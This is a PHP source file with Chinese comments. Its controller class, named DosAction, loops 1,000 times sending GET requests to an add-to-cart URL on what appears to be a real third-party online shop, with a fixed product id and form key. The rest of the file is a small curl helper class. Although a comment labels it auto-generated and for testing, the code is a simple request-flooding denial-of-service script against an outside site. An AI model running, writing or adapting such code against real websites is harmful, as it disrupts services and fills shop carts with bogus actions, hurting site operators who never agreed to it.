<?php
// 本类由系统自动生成，仅供测试用途
class DosAction extends Action {
    public function index(){
			$curl=new curlClass();
			for($i=0;$i<1000;$i++){
				$curl->get('http://wwworg.glamulet.com/checkout/cart/add/uenc/aHR0cDovL3d3d29yZy5nbGFtdWxldC5jb20v/product/1377/form_key/B5NVelCPVtv8iMxJ/');
				dump($i);
			}
	
    }
	
	
	
}


class curlClass {

    public function get($url, $params=array()) {
        //初始化curl对象
        $ch = curl_init();
        //设置 cur 相应属性 
        curl_setopt($ch, CURLOPT_URL, $url . '?' . http_build_query($params)); //设置curl请求url
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2); //设置curl最大请求时间
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //设置curl是否有返回数据
        //执行curl（有返回数据）
        $returnTransfer = curl_exec($ch);
        //关闭curl
        curl_close($ch);
        //返回数据
        return $returnTransfer;
    }

    public function post($url, $params=array()) {
        //初始化curl对象
        $ch = curl_init();
        // 设置 curl 相应属性 
        curl_setopt($ch, CURLOPT_URL, $url); //设置curl请求url
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2); //设置curl最大请求时间
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //设置curl是否有返回数据
        curl_setopt($ch, CURLOPT_POST, true); //设置curl POST方式提交数据
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params); //设置curl POST 表单数据
        //执行curl（有返回数据）
        $returnTransfer = curl_exec($ch);
        //关闭curl
        curl_close($ch);
        //返回数据
        return $returnTransfer;
    }

}





